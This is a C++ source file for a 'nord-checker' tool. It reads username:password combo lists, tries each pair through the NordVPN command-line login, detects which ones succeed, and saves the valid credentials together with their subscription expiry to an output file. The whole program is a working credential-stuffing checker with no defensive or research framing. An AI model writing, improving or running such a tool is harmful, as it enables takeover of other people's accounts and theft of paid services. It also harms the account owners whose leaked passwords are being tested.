#include <iostream>
#include <string>
#include <cstring>
#include <fstream>
#include <unistd.h>
#include <sys/wait.h>
#include <fcntl.h>

//#define __DEBUG
#define BUFLEN 1000
#define LIMIT 100
#define STATUS_SUCCESS 0
#define STATUS_FAILURE 1
#define STATUS_API_REFUSED 2
using namespace std;

void parseArgs(int argc, char *argv[]);
void parseCombo(const string& combo, string& username, string& password);
int checkStatus(int rfd);
bool nordvpn_logout(void);
string getExpiry(void);

int main(int argc, char* argv[])
{
    parseArgs(argc, argv);

    ifstream ifile{argv[2]};
    if(ifile.fail() || ifile.bad())
    {
        cerr << "[ERROR]: nord-checker: Failed to Open Input file\n";
        return -1;
    }

    ofstream ofile{argv[4], std::fstream::out | std::fstream::app};
    if(ofile.fail() || ofile.bad())
    {
        cerr << "[ERROR]: nord-checker: Failed to Open Output file\n";
    }

    string combo, username, password;

    int count{1};
    while(count <= LIMIT) 
    {
        getline(ifile, combo);
	if(ifile.eof())
		break;
        parseCombo(combo, username, password);

	if(!nordvpn_logout())
	{
		cerr << "Failed to logout of NordVPN\n";
		return -1;
	}


	int fds[2];
	if(pipe(fds) == -1)
	{
		perror("pipe");
		exit(-1);
	}

        pid_t rpid = fork();
        if(rpid == -1)
        {
            perror("[ERROR]: nordvpn-checker: fork");
            return -1;
        }

        if(rpid == 0)
        {
		close(fds[0]);
		if(dup2(fds[1], STDOUT_FILENO) == -1)
		{
			perror("[ERROR]: nordvpn-checker: dup2");
			exit(-1);
		}
		close(fds[1]);

            int ret = execlp("nordvpn", "nordvpn", "login", "--username", username.c_str(), "--password", password.c_str(), nullptr);
            if(ret == -1)
            {
                perror("[ERROR]: nordvpn-checker: execlp");
                return -1;
            }
        }

	close(fds[1]);
    
	#ifdef __DEBUG
	cerr << "[DEBUG]: CPID Before Wait: " << rpid << '\n';
	#endif

	cout << count << ": Checking:\t" << combo << flush;
        pid_t cpid = wait(nullptr);

	#ifdef __DEBUG
	cerr << "[DEBUG]: CPID By Wait: " << cpid << '\n';
	#endif
	
        int status = checkStatus(fds[0]);
	close(fds[0]);

        if(status == STATUS_SUCCESS)
        {
            string expiry = getExpiry();
            ofile << combo << "\t|\tExpiry: " << expiry << endl;
            cout << "\t[SUCCESS]:" << "\tExpiry: " << expiry << '\n';
        }
        else if(status == STATUS_API_REFUSED)
        {
            cout << "\t[FAILURE]:\t[API REFUSED TO SERVE REQUEST]\n";
	    return -1;
        }
	else
	{
		cout << "\t[FAILURE]:\tWrong Credentials OR MFA\n";
	}

        count++;
    }


    ofile.close();
    ifile.close();
    
    return 0;
}

void parseArgs(int argc, char *argv[])
{
    if(argc != 5)
    {

        cerr << "[ERROR]: nord-checker: Invalid Number of Arguments\nUsage: " << "./nordchecker -f {input_file_path} -o {output_file_path}\n";
        exit(EXIT_FAILURE);
    }

    if(strcmp(argv[1], "-i") != 0 && strcmp(argv[1], "--input") != 0)
    {
        cerr << "[ERROR]: nord-checker: Invalid Flag: " << argv[1] << '\n';
        exit(EXIT_FAILURE);
    }

    if(strcmp(argv[3], "-o") != 0 && strcmp(argv[3], "--output") != 0)
    {
        cerr << "[ERROR]: nord-checker: Invalid Flag: " << argv[3] << '\n';
        exit(EXIT_FAILURE);
    }

}

void parseCombo(const string& combo, string& username, string& password)
{
    size_t delimPos = combo.find(":");
    username = combo.substr(0, delimPos);

    #ifdef __DEBUG
        cerr << "[DEBUG]: Username: " << username << '\n';
    #endif

    password = combo.substr(delimPos+1, string::npos);

    #ifdef __DEBUG
	size_t length{strlen(password.c_str())};
        cerr << "[DEBUG]: Password: " << password << '\n';
	cerr << "[DEBUG]: Length of Password: " << length << '\n';
	cerr << "[DEBUG]: Ascii Value of Last Character in Password: " << (int)password[length-1] << '\n';
    #endif

    return ;
}

bool nordvpn_logout(void)
{
	pid_t cpid = fork();
	if(cpid == -1)
	{
		perror("nordvpn_logout: fork");
		return false;
	}
	else if(cpid == 0)
	{
		int fd = open("/dev/null", O_WRONLY);
		if(fd == -1)
		{
			perror("nordvpn_logout: open");
			exit(-1);
		}

		if(dup2(fd, STDOUT_FILENO) == -1)
		{
			perror("nordvpn_logout: dup2");
			exit(-1);
		}
		if(dup2(fd, STDERR_FILENO) == -1)
		{
			perror("nordvpn_logout: dup2");
			exit(-1);
		}
		close(fd);

		int ret = execlp("nordvpn", "nordvpn", "logout", nullptr);
		if(ret == -1)
		{
			perror("nordvpn_logout: execlp");
			exit(-1);
		}
	}
	
	#ifdef __DEBUG
		cerr << "CPID before wait in nordvpn logout: " << cpid << '\n';
	#endif
	pid_t ret = wait(nullptr);
	#ifdef __DEBUG
		cerr << "CPID by wait in nordvpn logout: " << ret << '\n';
	#endif

	return true;
}

int checkStatus(int rfd)
{
	char buffer[BUFLEN];
	ssize_t count = read(rfd, buffer, BUFLEN-1);
	buffer[count] = '\0';
	
	#ifdef __DEBUG
		cout << "Count of Read Buffer: " << count;
		cout << "Content of Read Buffer: " << buffer << '\n';
	#endif

    string line{buffer};

        if(line.find("Welcome") != string::npos)
            return STATUS_SUCCESS;
	else if(line.find("It's not") != string::npos)
		return STATUS_API_REFUSED;

    return STATUS_FAILURE;
}

string getExpiry(void)
{
    	string line{"Unknown"};

	int fds[2];
	if(pipe(fds) == -1)
	{
		perror("getExpiry: pipe");
		return line;
	}

	pid_t cpid = fork();
	if(cpid == -1)
	{
		perror("getExpiry: fork");
		return line;
	}
	else if(cpid == 0)
	{
		close(fds[0]);
		if(dup2(fds[1], STDOUT_FILENO) == -1)
		{
			perror("getExpiry: dup2");
			exit(-1);
		}
		close(fds[1]);


		int ret = execlp("nordvpn", "nordvpn", "account", nullptr);
		if(ret == -1)
		{
			perror("getExpiry: execlp");
			exit(-1);
		}
	}

	close(fds[1]);
	
	pid_t rpid = wait(nullptr);


	char buffer[BUFLEN];
	ssize_t count = read(fds[0], buffer, BUFLEN-1);
	buffer[count-1] = '\0';
	close(fds[0]);

	line = buffer;

        size_t reqIndex = line.find("VPN Service:");
        if(reqIndex != string::npos)
            return line.substr(reqIndex + 12, string::npos);
    
    return "Unknown";
}
